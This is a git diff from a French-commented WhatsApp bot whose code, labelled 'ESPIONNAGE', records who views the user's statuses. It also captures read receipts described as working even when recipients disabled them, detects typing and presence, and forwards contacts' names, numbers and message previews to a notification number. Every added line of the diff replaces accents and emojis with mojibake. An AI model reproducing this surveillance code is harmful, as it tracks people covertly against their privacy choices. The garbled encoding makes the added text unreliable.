-          console.log(`[🔄] Tentative ${reconnectAttempts}/${MAX_RECONNECT_ATTEMPTS} dans ${(waitTime/1000).toFixed(1)}s...`);
+          console.log(`[ðŸ”„] Tentative ${reconnectAttempts}/${MAX_RECONNECT_ATTEMPTS} dans ${(waitTime/1000).toFixed(1)}s...`);
           isReconnecting = false;
           await delay(waitTime);
           startBot();
@@ -7706,21 +7706,21 @@ async function startBot() {
 
   hani.ev.on("creds.update", saveCredsWrapper);
 
-  // ────────── ️ ESPIONNAGE: QUI VOIT MES STATUTS ──────────
-  // Capturer TOUTES les vues de statuts (même avec confirmations désactivées)
+  // â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ ï¸ ESPIONNAGE: QUI VOIT MES STATUTS â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+  // Capturer TOUTES les vues de statuts (mÃªme avec confirmations dÃ©sactivÃ©es)
   hani.ev.on("message-receipt.update", async (updates) => {
     try {
-      console.log(`📨 [RECEIPT] ${updates.length} mise(s) à jour reçue(s)`);
+      console.log(`ðŸ“¨ [RECEIPT] ${updates.length} mise(s) Ã  jour reÃ§ue(s)`);
       if (!protectionState.spyStatusViews) {
-        console.log(`👁️ [STATUT] spyStatusViews désactivé`);
+        console.log(`ðŸ‘ï¸ [STATUT] spyStatusViews dÃ©sactivÃ©`);
         return;
       }
       
       for (const update of updates) {
         const { key, receipt } = update;
-        console.log(`📨 [RECEIPT] key.remoteJid=${key.remoteJid}, fromMe=${key.fromMe}`);
+        console.log(`ðŸ“¨ [RECEIPT] key.remoteJid=${key.remoteJid}, fromMe=${key.fromMe}`);
         
-        // Vérifier si c'est un statut (status@broadcast)
+        // VÃ©rifier si c'est un statut (status@broadcast)
         if (key.remoteJid === "status@broadcast" && key.fromMe) {
           // Quelqu'un a vu MON statut
           const viewerJid = receipt.userJid;
@@ -7730,7 +7730,7 @@ async function startBot() {
           const readTime = new Date(timestamp).toLocaleString("fr-FR");
           const formattedPhone = formatPhoneForDisplay(viewerNumber);
           
-          console.log(`👁️ [STATUT VU] ${viewerNumber} a vu ton statut`);
+          console.log(`ðŸ‘ï¸ [STATUT VU] ${viewerNumber} a vu ton statut`);
           
           // Stocker dans spyData
           spyData.statusViews.unshift({
@@ -7741,35 +7741,35 @@ async function startBot() {
             timeStr: readTime
           });
           
-          // Limiter le nombre d'entrées
+          // Limiter le nombre d'entrÃ©es
           if (spyData.statusViews.length > spyData.maxEntries) {
             spyData.statusViews = spyData.statusViews.slice(0, spyData.maxEntries);
           }
           
-          // Envoyer notification à moi-même
+          // Envoyer notification Ã  moi-mÃªme
           const botJid = hani.user?.id?.split(":")[0] + "@s.whatsapp.net";
           
-          // 🆕 Utiliser getContactInfo pour avoir le nom enregistré
+          // ðŸ†• Utiliser getContactInfo pour avoir le nom enregistrÃ©
           const contactInfo = getContactInfo(viewerJid);
           
           await hani.sendMessage(botJid, {
-            text: `👁️ ═══════════════════════
+            text: `ðŸ‘ï¸ â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
     *QUELQU'UN A VU TON STATUT*
-═══════════════════════
+â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 
-👤 *Contact:* ${contactInfo}
-📝 *Nom WA:* ${viewerName || "Non enregistré"}
-📱 *Numéro:* ${formattedPhone}
-🕐 *Heure:* ${readTime}
+ðŸ‘¤ *Contact:* ${contactInfo}
+ðŸ“ *Nom WA:* ${viewerName || "Non enregistrÃ©"}
+ðŸ“± *NumÃ©ro:* ${formattedPhone}
+ðŸ• *Heure:* ${readTime}
 
-📞 *Appelle:* wa.me/${viewerNumber}
-💬 *Écris:* wa.me/${viewerNumber}
+ðŸ“ž *Appelle:* wa.me/${viewerNumber}
+ðŸ’¬ *Ã‰cris:* wa.me/${viewerNumber}
 
-═══════════════════════
-💡 _.spy_ pour voir tout le monde`
+â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+ðŸ’¡ _.spy_ pour voir tout le monde`
           });
           
-          console.log(`👁️ [STATUT VU] ${viewerName || viewerNumber} (${formattedPhone}) a vu ton statut`);
+          console.log(`ðŸ‘ï¸ [STATUT VU] ${viewerName || viewerNumber} (${formattedPhone}) a vu ton statut`);
         }
       }
     } catch (e) {
@@ -7777,23 +7777,23 @@ async function startBot() {
     }
   });
 
-  // ────────── 📖 ESPIONNAGE: QUI LIT MES MESSAGES ──────────
-  // Capturer les confirmations de lecture (même désactivées côté destinataire)
+  // â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ ðŸ“– ESPIONNAGE: QUI LIT MES MESSAGES â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+  // Capturer les confirmations de lecture (mÃªme dÃ©sactivÃ©es cÃ´tÃ© destinataire)
   const processedReadReceipts = new Set(); // Anti-doublon pour confirmations de lecture
   hani.ev.on("messages.update", async (updates) => {
     try {
-      console.log(`📖 [MSG UPDATE] ${updates.length} mise(s) à jour reçue(s)`);
+      console.log(`ðŸ“– [MSG UPDATE] ${updates.length} mise(s) Ã  jour reÃ§ue(s)`);
       for (const update of updates) {
         const { key, update: msgUpdate } = update;
-        console.log(`📖 [MSG UPDATE] fromMe=${key.fromMe}, status=${msgUpdate?.status}`);
+        console.log(`ðŸ“– [MSG UPDATE] fromMe=${key.fromMe}, status=${msgUpdate?.status}`);
         
-        // Si c'est mon message et il a été lu
+        // Si c'est mon message et il a Ã©tÃ© lu
         if (key.fromMe && msgUpdate.status === 4) { // status 4 = read/lu
-          console.log(`📖 [MESSAGE LU] Détecté: ${key.remoteJid}`);
-          // 🔒 ANTI-DOUBLON: Vérifier si déjà traité
+          console.log(`ðŸ“– [MESSAGE LU] DÃ©tectÃ©: ${key.remoteJid}`);
+          // ðŸ”’ ANTI-DOUBLON: VÃ©rifier si dÃ©jÃ  traitÃ©
           const readKey = `${key.id}_${key.remoteJid}`;
           if (processedReadReceipts.has(readKey)) {
-            console.log(`📖 [MESSAGE LU] Doublon ignoré`);
+            console.log(`ðŸ“– [MESSAGE LU] Doublon ignorÃ©`);
             continue;
           }
           processedReadReceipts.add(readKey);
@@ -7810,9 +7810,9 @@ async function startBot() {
           
           const recipientNumber = recipientJid?.split("@")[0];
           
-          // ⚠️ IGNORER LES LID (Linked ID) - ce ne sont pas de vrais numéros
+          // âš ï¸ IGNORER LES LID (Linked ID) - ce ne sont pas de vrais numÃ©ros
           if (isLID(recipientNumber)) {
-            console.log(`📖 [IGNORÉ] LID détecté, pas un vrai numéro: ${recipientNumber}`);
+            console.log(`ðŸ“– [IGNORÃ‰] LID dÃ©tectÃ©, pas un vrai numÃ©ro: ${recipientNumber}`);
             continue;
           }
           
@@ -7830,40 +7830,40 @@ async function startBot() {
             timeStr: readTime
           });
           
-          // Limiter le nombre d'entrées
+          // Limiter le nombre d'entrÃ©es
           if (spyData.messageReads.length > spyData.maxEntries) {
             spyData.messageReads = spyData.messageReads.slice(0, spyData.maxEntries);
           }
           
-          // Envoyer notification si activé
+          // Envoyer notification si activÃ©
           if (protectionState.spyReadReceipts) {
-            // 🆕 Utiliser getContactInfo pour nom + numéro
+            // ðŸ†• Utiliser getContactInfo pour nom + numÃ©ro
             const contactInfo = getContactInfo(recipientJid);
             
-            console.log(`📖 [LECTURE] Envoi notification vers ${NOTIFICATION_NUMBER}`);
+            console.log(`ðŸ“– [LECTURE] Envoi notification vers ${NOTIFICATION_NUMBER}`);
             
             try {
               await hani.sendMessage(NOTIFICATION_NUMBER, {
-                text: `📖 ═══════════════════════
+                text: `ðŸ“– â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
     *MESSAGE LU PAR*
-═══════════════════════
+â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 
-👤 *Contact:* ${contactInfo}
-📝 *Nom WA:* ${recipientName || "Non enregistré"}
-🕐 *Lu à:* ${readTime}
+ðŸ‘¤ *Contact:* ${contactInfo}
+ðŸ“ *Nom WA:* ${recipientName || "Non enregistrÃ©"}
+ðŸ• *Lu Ã :* ${readTime}
 
-📞 *Appelle:* wa.me/${recipientNumber}
-💬 *Écris:* wa.me/${recipientNumber}
+ðŸ“ž *Appelle:* wa.me/${recipientNumber}
+ðŸ’¬ *Ã‰cris:* wa.me/${recipientNumber}
 
-═══════════════════════`
+â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•`
               });
-              console.log(`✅ [LECTURE] Notification envoyée vers ${NOTIFICATION_NUMBER}!`);
+              console.log(`âœ… [LECTURE] Notification envoyÃ©e vers ${NOTIFICATION_NUMBER}!`);
             } catch (readErr) {
-              console.log(`❌ [LECTURE] Erreur: ${readErr.message}`);
+              console.log(`âŒ [LECTURE] Erreur: ${readErr.message}`);
             }
           }
           
-          console.log(`📖 [MESSAGE LU] ${recipientName || recipientNumber} (${formattedPhone}) a lu ton message`);
+          console.log(`ðŸ“– [MESSAGE LU] ${recipientName || recipientNumber} (${formattedPhone}) a lu ton message`);
         }
       }
     } catch (e) {
@@ -7871,7 +7871,7 @@ async function startBot() {
     }
   });
 
-  // ────────── GESTION DES CONTACTS ──────────
+  // â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ GESTION DES CONTACTS â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
   // Mettre en cache les noms des contacts pour les utiliser dans les messages
   hani.ev.on("contacts.upsert", (contacts) => {
     for (const contact of contacts) {
@@ -7879,7 +7879,7 @@ async function startBot() {
       const name = contact.name || contact.notify || contact.verifiedName;
       if (jid && name) {
         cacheContactName(jid, name);
-        console.log(`📇 Contact mis en cache: ${name} (${jid.split("@")[0]})`);
+        console.log(`ðŸ“‡ Contact mis en cache: ${name} (${jid.split("@")[0]})`);
       }
     }
   });
@@ -7894,8 +7894,8 @@ async function startBot() {
     }
   });
 
-  // ────────── 🕵️ DÉTECTION DE PRÉSENCE (QUELQU'UN ENTRE DANS VOTRE CHAT) ──────────
-  // Détecte quand quelqu'un est en train d'écrire ou est actif dans une discussion privée
+  // â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ ðŸ•µï¸ DÃ‰TECTION DE PRÃ‰SENCE (QUELQU'UN ENTRE DANS VOTRE CHAT) â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+  // DÃ©tecte quand quelqu'un est en train d'Ã©crire ou est actif dans une discussion privÃ©e
   hani.ev.on("presence.update", async (presenceData) => {
     try {
       if (!protectionState.spyPresence) return;
@@ -7906,67 +7906,67 @@ async function startBot() {
       // Ignorer les groupes et les statuts
       if (!chatJid || chatJid.endsWith("@g.us") || chatJid === "status@broadcast") return;
       
-      // Parcourir les présences détectées
+      // Parcourir les prÃ©sences dÃ©tectÃ©es
       for (const [participantJid, presence] of Object.entries(presences || {})) {
-        // Ignorer ma propre présence
+        // Ignorer ma propre prÃ©sence
         if (participantJid === botNumber || participantJid.split("@")[0] === hani.user?.id?.split(":")[0]) {
           continue;
         }
         
-        // Détecter si quelqu'un est actif (composing = en train d'écrire, paused = vient de s'arrêter d'écrire)
+        // DÃ©tecter si quelqu'un est actif (composing = en train d'Ã©crire, paused = vient de s'arrÃªter d'Ã©crire)
         const lastKnownPresence = presence?.lastKnownPresence;
         
-        // Événements intéressants : "composing" (écrit), "recording" (enregistre vocal), "available" (en ligne dans le chat)
+        // Ã‰vÃ©nements intÃ©ressants : "composing" (Ã©crit), "recording" (enregistre vocal), "available" (en ligne dans le chat)
         if (lastKnownPresence === "composing" || lastKnownPresence === "recording" || lastKnownPresence === "available") {
           
           const participantNumber = participantJid.split("@")[0];
           
-          // ⚠️ IGNORER LES LID (Linked ID) - ce ne sont pas de vrais numéros
+          // âš ï¸ IGNORER LES LID (Linked ID) - ce ne sont pas de vrais numÃ©ros
           if (isLID(participantNumber)) {
-            console.log(`🕵️ [IGNORÉ] LID détecté dans présence: ${participantNumber}`);
+            console.log(`ðŸ•µï¸ [IGNORÃ‰] LID dÃ©tectÃ© dans prÃ©sence: ${participantNumber}`);
             continue;
           }
           
           const cooldownKey = `${participantNumber}_${lastKnownPresence}`;
           const now = Date.now();
           
-          // Cooldown de 10 minutes par personne et par type d'action pour éviter le spam
+          // Cooldown de 10 minutes par personne et par type d'action pour Ã©viter le spam
           const lastNotified = spyData.presenceCooldown[cooldownKey] || 0;
           if (now - lastNotified < 10 * 60 * 1000) {
-            continue; // Déjà notifié récemment
+            continue; // DÃ©jÃ  notifiÃ© rÃ©cemment
           }
           
-          // Marquer comme notifié
+          // Marquer comme notifiÃ©
           spyData.presenceCooldown[cooldownKey] = now;
           
-          // Formater le numéro pour affichage
+          // Formater le numÃ©ro pour affichage
           const formattedPhone = formatPhoneForDisplay ? formatPhoneForDisplay(participantNumber) : `+${participantNumber}`;
-          // 🆕 Utiliser getContactInfo pour nom + numéro
+          // ðŸ†• Utiliser getContactInfo pour nom + numÃ©ro
           const contactInfo = getContactInfo(participantJid);
           const contactName = getCachedContactName(participantJid) || "Inconnu";
           const detectTime = new Date(now).toLocaleString("fr-FR");
           
-          // Déterminer l'action
+          // DÃ©terminer l'action
           let actionText, actionEmoji;
           switch (lastKnownPresence) {
             case "composing":
-              actionText = "est en train d'écrire";
-              actionEmoji = "✍️";
+              actionText = "est en train d'Ã©crire";
+              actionEmoji = "âœï¸";
               break;
             case "recording":
               actionText = "enregistre un vocal";
-              actionEmoji = "🎤";
+              actionEmoji = "ðŸŽ¤";
               break;
             case "available":
               actionText = "est en ligne dans votre chat";
-              actionEmoji = "👁️";
+              actionEmoji = "ðŸ‘ï¸";
               break;
             default:
               actionText = "est actif";
-              actionEmoji = "📱";
+              actionEmoji = "ðŸ“±";
           }
           
-          // Enregistrer la détection
+          // Enregistrer la dÃ©tection
           spyData.presenceDetected.push({
             participant: participantJid,
             number: participantNumber,
@@ -7980,30 +7980,30 @@ async function startBot() {
             spyData.presenceDetected = spyData.presenceDetected.slice(-spyData.maxEntries);
           }
           
-          // Envoyer notification à moi-même (botNumber)
-          console.log(`👁️ [PRESENCE] Envoi notification vers ${botNumber}`);
+          // Envoyer notification Ã  moi-mÃªme (botNumber)
+          console.log(`ðŸ‘ï¸ [PRESENCE] Envoi notification vers ${botNumber}`);
           
-          const notificationMsg = `╔═══════════════════════════════╗
-║   👁️ PRÉSENCE DÉTECTÉE 👁️   ║
-╠═══════════════════════════════╣
-║ ${actionEmoji} Quelqu'un ${actionText}!
-╠═══════════════════════════════╣
-║ 👤 Contact: ${contactInfo}
-║ 📝 Nom WA: ${contactName}
-║ 🔗 Lien: wa.me/${participantNumber}
-║ 🕐 Heure: ${detectTime}
-╠═══════════════════════════════╣
-║ 💡 Cette personne a ouvert
-║    votre discussion privée!
-╚═══════════════════════════════╝`;
+          const notificationMsg = `â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
+â•‘   ðŸ‘ï¸ PRÃ‰SENCE DÃ‰TECTÃ‰E ðŸ‘ï¸   â•‘
+â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£
+â•‘ ${actionEmoji} Quelqu'un ${actionText}!
+â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£
+â•‘ ðŸ‘¤ Contact: ${contactInfo}
+â•‘ ðŸ“ Nom WA: ${contactName}
+â•‘ ðŸ”— Lien: wa.me/${participantNumber}
+â•‘ ðŸ• Heure: ${detectTime}
+â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£
+â•‘ ðŸ’¡ Cette personne a ouvert
+â•‘    votre discussion privÃ©e!
+â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•`;
 
           try {
             await hani.sendMessage(NOTIFICATION_NUMBER, { text: notificationMsg });
-            console.log(`✅ [PRESENCE] Notification envoyée vers ${NOTIFICATION_NUMBER}!`);
+            console.log(`âœ… [PRESENCE] Notification envoyÃ©e vers ${NOTIFICATION_NUMBER}!`);
           } catch (presErr) {
-            console.log(`❌ [PRESENCE] Erreur: ${presErr.message}`);
+            console.log(`âŒ [PRESENCE] Erreur: ${presErr.message}`);
           }
-          console.log(`👁️ Présence détectée: ${contactName} (${participantNumber}) - ${lastKnownPresence}`);
+          console.log(`ðŸ‘ï¸ PrÃ©sence dÃ©tectÃ©e: ${contactName} (${participantNumber}) - ${lastKnownPresence}`);
         }
       }
     } catch (e) {
@@ -8012,40 +8012,40 @@ async function startBot() {
     }
   });
 
-  // ────────── GESTION DES MESSAGES ──────────
+  // â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ GESTION DES MESSAGES â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
   hani.ev.on("messages.upsert", async (m) => {
     try {
       const msg = m.messages?.[0];
       if (!msg || !msg.message) return;
 
-      // 🔐 VÉRIFICATION: hani.user doit être défini
+      // ðŸ” VÃ‰RIFICATION: hani.user doit Ãªtre dÃ©fini
       if (!hani.user || !hani.user.id) {
-        console.log(`⚠️ [MSG] hani.user non défini, attente connexion...`);
+        console.log(`âš ï¸ [MSG] hani.user non dÃ©fini, attente connexion...`);
         return;
       }
 
-      // 📩 LOG: Message reçu
+      // ðŸ“© LOG: Message reÃ§u
       const fromJid = msg.key?.remoteJid;
       const isFromMe = msg.key?.fromMe;
-      console.log(`📩 [MSG] Reçu de ${fromJid?.split("@")[0]} | fromMe=${isFromMe} | type=${m.type}`);
+      console.log(`ðŸ“© [MSG] ReÃ§u de ${fromJid?.split("@")[0]} | fromMe=${isFromMe} | type=${m.type}`);
 
       const sender = msg.key.participant || msg.key.remoteJid;
       const from = msg.key.remoteJid;
       const botNumber = hani.user.id.split(":")[0] + "@s.whatsapp.net";
       const senderName = msg.pushName || "Inconnu";
       
-      console.log(`📩 [MSG] Traitement: sender=${sender?.split("@")[0]}, senderName=${senderName}, botNumber=${botNumber}`);
+      console.log(`ðŸ“© [MSG] Traitement: sender=${sender?.split("@")[0]}, senderName=${senderName}, botNumber=${botNumber}`);
       
-      // 🆕 ENREGISTRER LE CONTACT QUAND QUELQU'UN M'ENVOIE UN MESSAGE
+      // ðŸ†• ENREGISTRER LE CONTACT QUAND QUELQU'UN M'ENVOIE UN MESSAGE
       // Cela permet de sauvegarder son nom WhatsApp pour l'utiliser plus tard
-      console.log(`📇 [CONTACT-CHECK] fromMe=${msg.key.fromMe}, sender=${sender?.split("@")[0]}, isGroup=${from?.endsWith("@g.us")}`);
+      console.log(`ðŸ“‡ [CONTACT-CHECK] fromMe=${msg.key.fromMe}, sender=${sender?.split("@")[0]}, isGroup=${from?.endsWith("@g.us")}`);
       
       if (!msg.key.fromMe && sender && !from?.endsWith("@g.us")) {
         const contactNumber = sender.split("@")[0];
         const isLIDNumber = isLID(contactNumber);
-        console.log(`📇 [CONTACT-CHECK] contactNumber=${contactNumber}, length=${contactNumber?.length}, isLID=${isLIDNumber}`);
+        console.log(`ðŸ“‡ [CONTACT-CHECK] contactNumber=${contactNumber}, length=${contactNumber?.length}, isLID=${isLIDNumber}`);
         
-        // Accepter les numéros avec au moins 6 chiffres (certains pays ont des numéros courts)
+        // Accepter les numÃ©ros avec au moins 6 chiffres (certains pays ont des numÃ©ros courts)
         if (contactNumber && contactNumber.length >= 6 && !isLIDNumber) {
           if (!contactsDB.has(contactNumber)) {
             contactsDB.set(contactNumber, {
@@ -8059,52 +8059,52 @@ async function startBot() {
               isBlocked: false,
               notes: ""
             });
-            console.log(`📇 [CONTACT] ✅ NOUVEAU ENREGISTRÉ: ${senderName} (${formatPhoneNumber(contactNumber)})`);
+            console.log(`ðŸ“‡ [CONTACT] âœ… NOUVEAU ENREGISTRÃ‰: ${senderName} (${formatPhoneNumber(contactNumber)})`);
           } else {
             const contact = contactsDB.get(contactNumber);
             if (senderName && senderName !== "Inconnu" && senderName.length > 1) {
-              contact.name = senderName; // Mettre à jour le nom
+              contact.name = senderName; // Mettre Ã  jour le nom
             }
             contact.lastSeen = new Date().toLocaleString("fr-FR");
             contact.messageCount++;
-            console.log(`📇 [CONTACT] ♻️ MIS À JOUR: ${contact.name} (${contact.formattedNumber}) - ${contact.messageCount} messages`);
+            console.log(`ðŸ“‡ [CONTACT] â™»ï¸ MIS Ã€ JOUR: ${contact.name} (${contact.formattedNumber}) - ${contact.messageCount} messages`);
           }
         } else {
-          console.log(`📇 [CONTACT] ⚠️ IGNORÉ: numéro=${contactNumber}, raison=${isLIDNumber ? 'LID' : 'trop court'}`);
+          console.log(`ðŸ“‡ [CONTACT] âš ï¸ IGNORÃ‰: numÃ©ro=${contactNumber}, raison=${isLIDNumber ? 'LID' : 'trop court'}`);
         }
       }
       
-      // ═══════════════════════════════════════════════════════════
-      // 🔔 NOTIFICATION POUR TOUS LES MESSAGES PRIVÉS REÇUS
-      // ═══════════════════════════════════════════════════════════
-      console.log(`🔔 [NOTIF-CHECK] fromMe=${msg.key.fromMe}, spyReplies=${protectionState.spyReplies}, from=${from}, isStatus=${from === "status@broadcast"}, isGroup=${from?.endsWith("@g.us")}`);
+      // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+      // ðŸ”” NOTIFICATION POUR TOUS LES MESSAGES PRIVÃ‰S REÃ‡US
+      // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+      console.log(`ðŸ”” [NOTIF-CHECK] fromMe=${msg.key.fromMe}, spyReplies=${protectionState.spyReplies}, from=${from}, isStatus=${from === "status@broadcast"}, isGroup=${from?.endsWith("@g.us")}`);
       
       if (!msg.key.fromMe && protectionState.spyReplies && from !== "status@broadcast" && !from?.endsWith("@g.us")) {
-        console.log(`🔔 [NOTIF] ✅ Conditions remplies! Préparation notification...`);
+        console.log(`ðŸ”” [NOTIF] âœ… Conditions remplies! PrÃ©paration notification...`);
         const senderNumber = sender?.split("@")[0];
         
-        // ⚠️ IGNORER LES LID (Linked ID) - ce ne sont pas de vrais numéros
+        // âš ï¸ IGNORER LES LID (Linked ID) - ce ne sont pas de vrais numÃ©ros
         if (!isLID(senderNumber)) {
           const formattedPhone = formatPhoneForDisplay(senderNumber);
           const timestamp = Date.now();
           const readTime = new Date(timestamp).toLocaleString("fr-FR");
           
-          // Extraire un aperçu du message
+          // Extraire un aperÃ§u du message
           const msgPreview = msg.message?.conversation || 
                             msg.message?.extendedTextMessage?.text ||
                             msg.message?.imageMessage?.caption ||
                             msg.message?.videoMessage?.caption ||
-                            (msg.message?.audioMessage ? "🎵 Vocal" : "") ||
-                            (msg.message?.imageMessage ? "📷 Photo" : "") ||
-                            (msg.message?.videoMessage ? "🎬 Vidéo" : "") ||
-                            (msg.message?.stickerMessage ? "🎴 Sticker" : "") ||
-                            "📩 Message";
+                            (msg.message?.audioMessage ? "ðŸŽµ Vocal" : "") ||
+                            (msg.message?.imageMessage ? "ðŸ“· Photo" : "") ||
+                            (msg.message?.videoMessage ? "ðŸŽ¬ VidÃ©o" : "") ||
+                            (msg.message?.stickerMessage ? "ðŸŽ´ Sticker" : "") ||
+                            "ðŸ“© Message";
           
-          // Vérifier si c'est une réponse à mon message
+          // VÃ©rifier si c'est une rÃ©ponse Ã  mon message
           const quotedMsg = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage;
           const isReply = !!quotedMsg;
           
-          // Vérifier si on a envoyé un message à cette personne récemment (dans les 24h)
+          // VÃ©rifier si on a envoyÃ© un message Ã  cette personne rÃ©cemment (dans les 24h)
           const pendingTime = spyData.pendingMessages[from];
           const isFollowUp = pendingTime && (timestamp - pendingTime < 24 * 60 * 60 * 1000);
           
@@ -8119,36 +8119,36 @@ async function startBot() {
             isDirectReply: isReply
           });
           
-          // Limiter les entrées
+          // Limiter les entrÃ©es
           if (spyData.replies.length > spyData.maxEntries) {
             spyData.replies = spyData.replies.slice(0, spyData.maxEntries);
           }
           
-          // Déterminer le type d'action
-          let actionType = "T'A ÉCRIT";
-          let actionDesc = "💬 _Nouveau message reçu_";
+          // DÃ©terminer le type d'action
+          let actionType = "T'A Ã‰CRIT";
+          let actionDesc = "ðŸ’¬ _Nouveau message reÃ§u_";
           if (isReply) {
-            actionType = "RÉPONDU À TON MESSAGE";
-            actionDesc = "↩️ _Cette personne a RÉPONDU à ton message!_";
+            actionType = "RÃ‰PONDU Ã€ TON MESSAGE";
+            actionDesc = "â†©ï¸ _Cette personne a RÃ‰PONDU Ã  ton message!_";
           } else if (isFollowUp) {
-            actionType = "T'A RÉPONDU";
-            actionDesc = "💡 _Cette personne t'a écrit après ton message!_";
+            actionType = "T'A RÃ‰PONDU";
+            actionDesc = "ðŸ’¡ _Cette personne t'a Ã©crit aprÃ¨s ton message!_";
           }
           
-          // 🆕 AJOUTER AUX LECTURES CONFIRMÉES (répondre = preuve de lecture!)
+          // ðŸ†• AJOUTER AUX LECTURES CONFIRMÃ‰ES (rÃ©pondre = preuve de lecture!)
           spyData.messageReads.unshift({
             reader: senderNumber,
             readerName: senderName,
             readerJid: from,
             timestamp: timestamp,
             timeStr: readTime,
-            confirmedBy: isReply ? "réponse" : "message"
+            confirmedBy: isReply ? "rÃ©ponse" : "message"
           });
           if (spyData.messageReads.length > spyData.maxEntries) {
             spyData.messageReads = spyData.messageReads.slice(0, spyData.maxEntries);
           }
           
-          // 🆕 AJOUTER AUX PRÉSENCES (écrire = présence confirmée!)
+          // ðŸ†• AJOUTER AUX PRÃ‰SENCES (Ã©crire = prÃ©sence confirmÃ©e!)
           spyData.presenceDetected.unshift({
             jid: from,
             name: senderName,
@@ -8161,60 +8161,60 @@ async function startBot() {
             spyData.presenceDetected = spyData.presenceDetected.slice(0, spyData.maxEntries);
           }
           
-          // Utiliser getContactInfo pour avoir le nom enregistré
+          // Utiliser getContactInfo pour avoir le nom enregistrÃ©
           const contactInfo = getContactInfo(sender);
           
-          console.log(`📨 [NOTIF] Envoi notification "${actionType}" de ${contactInfo} vers ${NOTIFICATION_NUMBER}`);
+          console.log(`ðŸ“¨ [NOTIF] Envoi notification "${actionType}" de ${contactInfo} vers ${NOTIFICATION_NUMBER}`);
           
           try {
             await hani.sendMessage(NOTIFICATION_NUMBER, {
-              text: `📖 ═══════════════════════════
-    *${actionType}* ✅
-═══════════════════════════
+              text: `ðŸ“– â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+    *${actionType}* âœ…
+â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 
-👤 *Contact:* ${contactInfo}
-📝 *Nom WhatsApp:* ${senderName}
-📱 *Numéro:* ${formattedPhone}
-🕐 *Quand:* ${readTime}
+ðŸ‘¤ *Contact:* ${contactInfo}
+ðŸ“ *Nom WhatsApp:* ${senderName}
+ðŸ“± *NumÃ©ro:* ${formattedPhone}
+ðŸ• *Quand:* ${readTime}
 
-💬 *Aperçu:* ${msgPreview.slice(0, 40)}${msgPreview.length > 40 ? "..." : ""}
+ðŸ’¬ *AperÃ§u:* ${msgPreview.slice(0, 40)}${msgPreview.length > 40 ? "..." : ""}
 
 ${actionDesc}
 
-📞 wa.me/${senderNumber}
+ðŸ“ž wa.me/${senderNumber}
 
-═══════════════════════════`
+â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•`
             });
-            console.log(`✅ [NOTIF] Notification envoyée avec succès`);
+            console.log(`âœ… [NOTIF] Notification envoyÃ©e avec succÃ¨s`);
           } catch (notifErr) {
-            console.log(`❌ [NOTIF] Erreur envoi notification: ${notifErr.message}`);
+            console.log(`âŒ [NOTIF] Erreur envoi notification: ${notifErr.message}`);
           }
           
-          console.log(`📖 [MESSAGE REÇU] ${senderName} (${formattedPhone}) - ${actionType}`);
+          console.log(`ðŸ“– [MESSAGE REÃ‡U] ${senderName} (${formattedPhone}) - ${actionType}`);
           
-          // Supprimer du pending si c'est une réponse/suivi
+          // Supprimer du pending si c'est une rÃ©ponse/suivi
           if (isReply || isFollowUp) {
             delete spyData.pendingMessages[from];
           }
         }
       }
       
-      // Enregistrer les messages ENVOYÉS pour tracker les réponses
-      console.log(`📤 [ENVOI-CHECK] fromMe=${msg.key.fromMe}, from=${from}, isStatus=${from === "status@broadcast"}, isGroup=${from?.endsWith("@g.us")}`);
+      // Enregistrer les messages ENVOYÃ‰S pour tracker les rÃ©ponses
+      console.log(`ðŸ“¤ [ENVOI-CHECK] fromMe=${msg.key.fromMe}, from=${from}, isStatus=${from === "status@broadcast"}, isGroup=${from?.endsWith("@g.us")}`);
       
       if (msg.key.fromMe && from !== "status@broadcast" && !from?.endsWith("@g.us")) {
-        console.log(`📤 [ENVOI] ✅ Message envoyé vers ${from?.split("@")[0]}`);
+        console.log(`ðŸ“¤ [ENVOI] âœ… Message envoyÃ© vers ${from?.split("@")[0]}`);
         spyData.pendingMessages[from] = Date.now();
         
-        // 🆕 ENREGISTRER LE CONTACT QUAND J'ENVOIE UN MESSAGE
+        // ðŸ†• ENREGISTRER LE CONTACT QUAND J'ENVOIE UN MESSAGE
         // Cela permet de retrouver le nom plus tard
         const recipientNumber = from.split("@")[0];
